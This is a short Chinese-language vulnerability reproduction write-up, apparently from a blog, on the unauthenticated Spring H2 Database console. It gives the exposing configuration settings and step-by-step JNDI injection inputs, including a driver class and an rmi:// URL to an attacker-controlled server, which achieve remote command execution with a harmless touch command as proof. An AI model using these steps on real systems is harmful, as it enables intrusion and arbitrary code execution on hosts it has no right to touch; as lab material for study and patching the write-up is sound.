# H2 Database Console 未授权访问

H2 database是一款Java[内存](https://so.csdn.net/so/search?q=内存&spm=1001.2101.3001.7020)数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：

- spring.h2.console.enabled=true
- spring.h2.console.settings.web-allow-others=true

利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令



# 漏洞复现

[JNDI注入](https://github.com/su18/JNDI)

通过github项目JNDI注入工具复现

下载工具后进入目录，修改`config.properties`文件，将命令改为`touch /tmp/success`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210618103852255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0VDX0NhcnJvdA==,size_16,color_FFFFFF,t_70)

更改保存后，启动jar程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210618104718447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0VDX0NhcnJvdA==,size_16,color_FFFFFF,t_70)

访问`http://your_ip:8080/h2-console/`

驱动类内填：

```bash
javax.naming.InitialContext
1
```

JDBC URL内填（即jar程序显示的rmi地址）：

```bash
rmi://172.18.0.1:23456/BypassByEL
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210618102825512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0VDX0NhcnJvdA==,size_16,color_FFFFFF,t_70)

点击链接后，回到靶机查看

![img](https://img-blog.csdnimg.cn/20210618103759707.png)

